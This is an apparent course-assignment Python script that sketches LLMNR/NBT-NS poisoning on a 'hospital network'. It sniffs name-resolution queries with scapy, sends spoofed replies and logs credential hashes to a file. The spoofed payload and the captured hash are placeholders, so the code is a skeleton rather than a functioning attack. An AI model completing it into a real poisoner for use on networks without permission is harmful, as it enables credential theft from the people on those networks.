"""
NBT_final.py
Active Directory Penetration Testing - LLMNR and NBT-NS Poisoning Script
For educational and authorized security testing only.

This script listens for LLMNR (port 5355) and NBT-NS (port 137) requests,
responds with spoofed replies, and captures authentication attempts.
"""

# Task 3: Import Necessary Python Libraries and Set Up Dependencies
import scapy.all as scapy
import socket
import sys  # Import sys for handling script exits

# Define the network interface to listen on
# This variable is checked by CodeGrade
INTERFACE = "eth0"

# Task 2: Add Functions to the Script

def sniff_requests():
    """
    Sniff LLMNR and NBT-NS requests on the network.
    Listens for UDP packets on ports 137 (NBT-NS) and 5355 (LLMNR).
    """
    print("[*] Listening for LLMNR and NBT-NS requests...")
    # Task 4: Use scapy.sniff() to capture LLMNR and NBT-NS requests
    # The filter captures UDP packets on ports 137 and 5355
    # prn=process_packet calls the process_packet function for each captured packet
    # store=False prevents storing packets in memory
    scapy.sniff(filter="udp port 137 or udp port 5355", prn=process_packet, store=False)


def process_packet(packet):
    """
    Process captured packets and check for LLMNR or NBT-NS requests.
    Checks if the packet has UDP and Raw layers, then looks for "QUERY" in the payload.
    """
    # Task 4: Check if packet has UDP layer and Raw payload
    if packet.haslayer(scapy.UDP) and packet.haslayer(scapy.Raw):
        # Decode the raw payload, ignoring errors for malformed packets
        payload = packet[scapy.Raw].load.decode(errors="ignore")
        # Check if the payload contains "QUERY" (indicating a name resolution request)
        if "QUERY" in payload:
            print(f"[!] Detected request for: {payload}")
            # Send a spoofed response to the victim
            send_spoofed_response(packet)


def send_spoofed_response(packet):
    """
    Send a spoofed response to trick victims.
    Creates a fake response packet pretending to be the requested host.
    """
    # Task 4: Build and send a spoofed response
    # Create a response packet with:
    # - Destination IP: Source IP of the original packet (victim)
    # - Destination Port: Source port of the original packet
    # - Raw payload: Fake response
    response_packet = scapy.IP(dst=packet[scapy.IP].src) / \
                      scapy.UDP(dport=packet[scapy.UDP].sport) / \
                      scapy.Raw(load="FAKE_RESPONSE")
    
    # Send the spoofed response packet
    scapy.send(response_packet, verbose=False)
    print("[+] Spoofed response sent")
    
    # After sending the spoofed response, the victim will try to authenticate
    # Capture the credentials (in a real attack, this would be the NTLM hash)
    capture_credentials("NTLMv2_HASH_CAPTURED")


def capture_credentials(data):
    """
    Capture and log authentication attempts.
    Stores intercepted hashes in a file for later analysis.
    """
    # Task 5: Log authentication attempts to a file
    # Open hospital_hashes.txt in append mode and write the captured data
    with open("hospital_hashes.txt", "a") as file:
        file.write(data + "\n")
    print("[+] Captured credentials saved")


def main():
    """
    Main function to start the poisoning script.
    Includes try-except for graceful shutdown with Ctrl+C.
    """
    # Task 7: Implement Safeguards and Cleanup Procedures
    try:
        print("[*] Starting hospital network LLMNR and NBT-NS poisoning script...")
        # Start sniffing for LLMNR and NBT-NS requests
        sniff_requests()
    except KeyboardInterrupt:
        # Gracefully handle Ctrl+C to stop the script
        print("\n[!] Script terminated by user.")
        sys.exit(0)


# Entry point of the script
if __name__ == "__main__":
    main()
